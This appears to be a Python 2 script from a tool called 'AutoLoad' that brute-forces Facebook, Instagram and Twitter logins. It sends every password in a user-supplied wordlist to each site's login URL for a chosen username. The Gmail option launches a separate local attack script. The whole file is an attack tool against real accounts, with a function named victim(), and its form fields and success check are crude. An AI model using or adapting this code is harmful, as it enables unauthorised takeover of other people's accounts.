import os
import sys
import socket
import requests
from colorama import Fore
def victim():
    os.system('clear')
    print("")
    print(Fore.GREEN +"[*]:::::Bruteforce Instagram, Facebook, Gmail and Twitter:::::::")
    print("")
    print("1.)"+Fore.WHITE +" Facebook")
    print(Fore.GREEN +"2.)"+Fore.WHITE +" Instagram ")
    print(Fore.GREEN +"3.)"+Fore.WHITE +" Twitter ")
    print(Fore.GREEN +"4.)"+Fore.WHITE +" Gmail ")
    print("")
    print(Fore.GREEN +"6.)"+Fore.YELLOW +" Exit")
    print("")
    userif = ''
    while not(userif == '1' or userif == '2' or userif == '3' or userif == '4'):
        userif=raw_input(Fore.GREEN +"[autoload:] > "+Fore.WHITE)
        if userif == '1':
            os.system('clear')
            print("")
            print(Fore.GREEN +"[*]::::: Bruteforcing Facebook :::::::")
            print("")
            user=raw_input("[Username:]>")
            word=raw_input("[Wordlist:]>")
            facebook = {'name':'Facebook','url':'https://mbasic.facebook.com/login.php','form1':'','form2':''}
            passlist = word
            username = user
            target_url = facebook['url']
            with open(passlist,"r") as wordlist:
                 for line in wordlist:
                      try:
                           word = line.strip()
                           facebook["form2"] = word
                           facebook["form1"] = username
                           response = requests.post(target_url, data=facebook)
                           if "Login failed" not in response.content:
                                print(Fore.GREEN+"[+] Password Found --> "+Fore.WHITE + word)
                                exit()
                      except requests.exceptions.ConnectionError:
                           user = raw_input("[!] Connection Error!")
                           exit()

            print(Fore.RED+"[+] Password not Found!")
            print("")
            userrr=raw_input(Fore.YELLOW +"press any key to go back...")
            import hypr
        elif userif == '2':
            os.system('clear')
            print("")
            print(Fore.GREEN +"[*]::::: Bruteforcing Instagram :::::::")
            print("")
            userr=raw_input("[Username:]>")
            words=raw_input("[Wordlist:]>")
            instagram = {'name':'Instagram', 'url':'https://www.instagram.com/accounts/login/?force_classic_login', 'form1':'', 'form2':''}
            passlist = words
            username = userr
            target_url = instagram['url']
            with open(passlist,"r") as wordlist:
                 for line in wordlist:
                      try:
                           word = line.strip()
                           instagram["form2"] = word
                           instagram["form1"] = username
                           response = requests.post(target_url, data=instagram)
                           if "Login failed" not in response.content:
                                print(Fore.GREEN+"[+] Password Found --> "+Fore.WHITE + word)
                                exit()
                      except requests.exceptions.ConnectionError:
                           user = raw_input("[!] Connection Error!")
                           exit()

            print(Fore.RED+"[+] Password not Found!")
            userrr=raw_input(Fore.YELLOW +"press any key to go back...")
            import hypr
        elif userif == '3':
            os.system('clear')
            print("")
            print(Fore.GREEN +"[*]::::: Bruteforcing Twitter :::::::")
            print("")
            userrrr=raw_input("[Username:] >")
            wordlist=raw_input("[Wordlist:] >")
            twitter = {'name':'Twitter', 'url':'https://m.twitter.com/login/', 'form1':'', 'form2':''}
            passlist = wordlist
            username = userrrr
            target_url = twitter['url']
            with open(passlist,"r") as wordlist:
                 for line in wordlist:
                      try:
                           word = line.strip()
                           twitter["form2"] = word
                           twitter["form1"] = username
                           response = requests.post(target_url, data=twitter)
                           if "Login failed" not in response.content:
                                print(Fore.GREEN+"[+] Password Found --> "+Fore.WHITE + word)
                                exit()
                      except requests.exceptions.ConnectionError:
                           user = raw_input("[!] Connection Error!")
                           exit()
            userrr=raw_input(Fore.YELLOW +"press any key to go back...")
            import hypr

        elif userif == '4':
            try:
                os.system('clear')
                os.system('python /root/AutoLoad/attack.py')
            except socket.gaierror:
                print(Fore.RED+ "Connection Error..")
            else:
                userrr=raw_input(Fore.YELLOW +"press any key to go back...")
                import hypr
            
            
        elif userif == '6':
            print("")
            print("Thanks For Using AutoLoad")
            sys.exit()
        else:
            print(Fore.RED +"Try Again")
            print(Fore.BLUE)

victim()
        
